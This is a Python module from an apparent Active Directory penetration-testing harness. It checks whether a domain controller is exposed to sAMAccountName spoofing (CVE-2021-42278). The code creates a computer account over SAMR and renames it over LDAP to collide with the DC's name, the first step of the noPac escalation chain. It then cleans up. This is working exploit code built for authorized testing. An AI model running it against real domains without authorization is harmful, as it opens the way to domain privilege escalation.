"""sAMAccountName Spoofing (CVE-2021-42278) — standalone, isolated from the
S4U2Self escalation chain (see modules/nopac.py for that). Tests ONE
specific control: does AD let a low-privileged user (a) create a computer
account via SAMR (gated by ms-DS-MachineAccountQuota) and then (b) rename
its sAMAccountName, via a plain LDAP modify, to collide with an existing
DC's name minus the trailing "$"?

This is the exact prerequisite CVE-2021-42287 (and noPac.py) builds on —
pulled out as its own module because a target can be vulnerable to this
half even when fully patched against the S4U2Self escalation (confirmed
against this lab's DC: KB5019966 blocks noPac's GetST step with
KDC_ERR_TGT_REVOKED, but the rename itself succeeds every time — see
modules/nopac.py's docstring/chat history). Reports that gap on its own,
without needing Kerberos at all (no clock-skew handling needed here,
unlike nopac.py — this only touches LDAP(389) + SAMR/SMB(445)).

Runs in-process (reusing the vendored noPac utils' AddComputerSAMR/LDAP
helpers) so modules/_portpatch.py can redirect a registered NAT'd
target's SMB leg. Always cleans up (restores the DC's real name, deletes
the test computer account) in `finally`, regardless of outcome — a
failed/interrupted run must not leave an orphan computer account behind
for the next engineer who runs this.
"""
import io
import sys
import random
import string
import logging
import importlib.util

from modules import _portpatch

META = {
    "id": "samaccountname_spoof",
    "name": "sAMAccountName Spoofing (CVE-2021-42278)",
    "category": "AD Exploitation",
    "test_type": "pentest",  # AD exploitation primitive, not the USS attack-sim scope (see README)
    "added": False,  # in the original baseline set (the AD-coercion slot; petitpotam is opt-in)
    "control": "ms-DS-MachineAccountQuota / sAMAccountName uniqueness validation",
    "fix": "Set ms-DS-MachineAccountQuota=0; reject computer-account renames that collide with an existing DC name",
    "mitre": ['T1136.002', 'T1078.002'],
    "cwe": ['CWE-290'],
    "tactic": 'Persistence',
    "requires": [],  # runs entirely in-process (ldap3/ldapdomaindump), not a shutil.which-checkable CLI tool
    "serial": True,  # in-process impacket + _portpatch swap process-global socket.connect; ALSO collides with nopac (both rename a machine account to the DC's name) — must run ALONE
    # preflight imports these so a shadowed/stale cryptography (breaks
    # cryptography.hazmat.asn1) is caught instead of a runtime NO-RESULT.
    "requires_py": ["impacket", "ldapdomaindump", "dns.asyncquery"],  # real runtime chain: dns.asyncquery -> cryptography.hazmat.asn1 trips a stale user-site cryptography (the actual noPac/sAMAccountName breakage)
    "ports": [("tcp", 389), ("tcp", 445)],
    "success_regex": r"SPOOF-CONFIRMED: sAMAccountName ==",
    "blocked_regex": (
        r"MachineAccountQuota exceeded|constraintViolation|insufficientAccessRights|"
        r"entryAlreadyExists|STATUS_ACCESS_DENIED|timed out|Connection refused|unreachable|Errno"
    ),
}

_NOPAC_VENDOR_DIR = __import__("os").path.join(
    __import__("os").path.dirname(__import__("os").path.abspath(__file__)), "_vendor", "nopac")


def _load_nopac_utils():
    """Reuse the AddComputerSAMR/LDAP helpers already vendored for
    modules/nopac.py instead of duplicating them."""
    import os
    if _NOPAC_VENDOR_DIR not in sys.path:
        sys.path.insert(0, _NOPAC_VENDOR_DIR)
    import argparse
    import ldap3
    import ldapdomaindump
    from utils.addcomputer import AddComputerSAMR
    from utils.helper import init_ldap_session, get_user_info, get_dc_host
    return argparse, ldap3, ldapdomaindump, AddComputerSAMR, init_ldap_session, get_user_info, get_dc_host


def run(target, ctx):
    # No domain password -> the vendored noPac/ldap PoC falls back to
    # getpass("Password:") and HANGS the run on an interactive prompt (sudo/root
    # does NOT supply a DC credential). Skip cleanly like psexec/dcsync/kerberoast.
    if not (ctx.creds.get("dc_pass") or "").strip():
        return (f"# sAMAccountName Spoofing vs {target}\n\n[SKIP] no domain password "
                "configured (set HARNESS_DC_PASS / --dc-pass / credentials.env) — needs "
                "valid domain creds; skipping to avoid an interactive password prompt.")
    is_custom = _portpatch.is_custom_port_target(target)
    header = f"# sAMAccountName Spoofing (in-process) vs {target}"
    header += " [custom-port patch active]\n\n" if is_custom else "\n\n"

    if is_custom:
        _portpatch.install(target)

    buf = io.StringIO()
    log_handler = logging.StreamHandler(buf)
    log_handler.setFormatter(logging.Formatter('[%(levelname)s] %(message)s'))
    root = logging.getLogger()
    root.addHandler(log_handler)
    root.setLevel(logging.INFO)

    creds = ctx.creds
    domain, user, password = creds["domain"], creds["dc_user"], creds["dc_pass"]
    renamed = False
    new_name = None
    ldap_session = None
    domain_dumper = None
    dc_host = None

    try:
        argparse, ldap3, ldapdomaindump, AddComputerSAMR, init_ldap_session, get_user_info, get_dc_host = \
            _load_nopac_utils()

        Options = argparse.Namespace(
            dc_ip=target, dc_host=None, hashes=None, aesKey=None, k=False,
            use_ldap=True, target_ip=None, port=445, domain_netbios=None,
            old_hash=None, old_pass=None,
        )

        ldap_session_pair = init_ldap_session(Options, domain, user, password, "", "")
        ldap_server, ldap_session = ldap_session_pair
        cnf = ldapdomaindump.domainDumpConfig()
        cnf.basepath = None
        domain_dumper = ldapdomaindump.domainDumper(ldap_server, ldap_session, cnf)

        dcinfo = get_dc_host(ldap_session, domain_dumper, Options)
        if not dcinfo:
            logging.error("Could not enumerate any DC via LDAP — can't pick a name to spoof.")
            return header + buf.getvalue()
        dc_host = list(dcinfo.keys())[0].lower()
        logging.info(f"Spoof target: {dc_host} (real DC, discovered via LDAP)")

        new_name = "WIN-" + "".join(random.sample(string.ascii_letters + string.digits, 11)).upper() + "$"
        new_pass = "".join(random.choice(string.ascii_letters + string.digits + "!@#$%") for _ in range(12))

        logging.info(f"Creating computer account {new_name} via SAMR (gated by ms-DS-MachineAccountQuota)")
        addc = AddComputerSAMR(user, password, domain, Options, computer_name=new_name, computer_pass=new_pass)
        addc.run()
        logging.info(f"Created {new_name}")

        dn = get_user_info(new_name, ldap_session, domain_dumper)
        if not dn:
            logging.error(f"Created {new_name} but couldn't look it up in LDAP afterward.")
            return header + buf.getvalue()
        machine_dn = str(dn["dn"])

        logging.info(f"Renaming sAMAccountName -> {dc_host} (spoofing the real DC's name)")
        ldap_session.modify(machine_dn, {"sAMAccountName": [ldap3.MODIFY_REPLACE, [dc_host]]})
        result = ldap_session.result
        if result["result"] == 0:
            renamed = True
            # Confirm it actually landed, not just that the call returned 0.
            check = get_user_info(dc_host, ldap_session, domain_dumper)
            if check and str(check["dn"]) == machine_dn:
                logging.info(f"SPOOF-CONFIRMED: sAMAccountName == {dc_host} on {machine_dn}")
                logging.info(f"AD accepted a spoofed computer account claiming to be the DC "
                             f"({dc_host}$) with no trailing '$' — this is the exact primitive "
                             f"CVE-2021-42287/noPac abuses next; whether that follow-on escalation "
                             f"also succeeds is tracked separately by modules/nopac.py.")
            else:
                logging.error(f"LDAP modify returned success but the rename didn't stick "
                              f"(lookup for {dc_host} didn't resolve back to {machine_dn}) — treat as blocked.")
        else:
            logging.error(f"Rename rejected: {result.get('description')} — {result.get('message')}")

        return header + buf.getvalue()
    except Exception as e:
        import traceback
        return header + buf.getvalue() + f"\n[ERROR] {type(e).__name__}: {e}\n{traceback.format_exc()}"
    finally:
        # Always restore + clean up, regardless of what happened above —
        # an orphaned spoofed/renamed computer account must not survive
        # this run, whether it succeeded, failed, or crashed midway.
        try:
            if ldap_session is not None and domain_dumper is not None and new_name is not None:
                if renamed and dc_host:
                    dn = get_user_info(dc_host, ldap_session, domain_dumper)
                    if dn:
                        ldap_session.modify(str(dn["dn"]), {"sAMAccountName": [ldap3.MODIFY_REPLACE, [new_name]]})
                        logging.info(f"Restored name -> {new_name}")
                dn = get_user_info(new_name, ldap_session, domain_dumper)
                if dn:
                    ldap_session.delete(str(dn["dn"]))
                    logging.info(f"Deleted test computer account {new_name}")
        except Exception as ce:
            logging.warning(f"cleanup issue: {ce}")
        root.removeHandler(log_handler)
        if is_custom:
            _portpatch.remove()
